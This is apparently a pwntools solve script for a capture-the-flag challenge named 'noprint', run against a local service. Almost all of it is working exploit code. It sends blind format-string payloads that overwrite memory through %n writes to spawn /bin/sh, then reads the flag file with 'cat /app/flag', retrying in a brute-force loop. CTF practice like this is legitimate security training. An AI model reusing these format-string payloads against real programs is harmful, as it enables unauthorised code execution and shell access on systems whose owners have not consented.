#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './noprint_patched'
elf = context.binary = ELF(exe, checksec=True)
libc = elf.libc
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = 'localhost', 1337

pid = None

def gdbscript():
    global pid
    gdbscript = f'''
    init-pwndbg
    set sysroot /proc/{pid}/root
    set resolve-heap-via-heuristic force
    c
    '''.format(**locals())
    return gdbscript

def initialize(argv=[]):
    global pid
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript())
    elif args.REMOTE:
        context.log_level = 'info'
        return connect(host, port)
    elif args.DOCKER:
        p = remote("localhost", 1337)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/app/run"]).recvall().strip().decode()
        return p
    else:
        return process([exe] + argv)




# =========================================================
#                         EXPLOITS
# =========================================================

def exploit():
    #p4st1s Solve Script
    global io
    io = initialize()
    io.sendline(b"%*7$c%64656c%11$hn")
    sleep(1)
    io.sendline(b"/bin/sh #%*12$c%199580c%31$n")
    sleep(1)
    io.sendline(b"cat /app/flag")
    io.recvline()
    try:
       leak = io.recv(5, timeout=0.1)
       if leak.startswith(b"PWNME"):
          print(leak)
          attach(int(pid), gdbscript=gdbscript(), sysroot=f"/proc/{pid}/root", exe='noprint')
          io.interactive()
       io.close()
    except:
       io.close()
    
if __name__ == '__main__':
    while True:
       exploit()
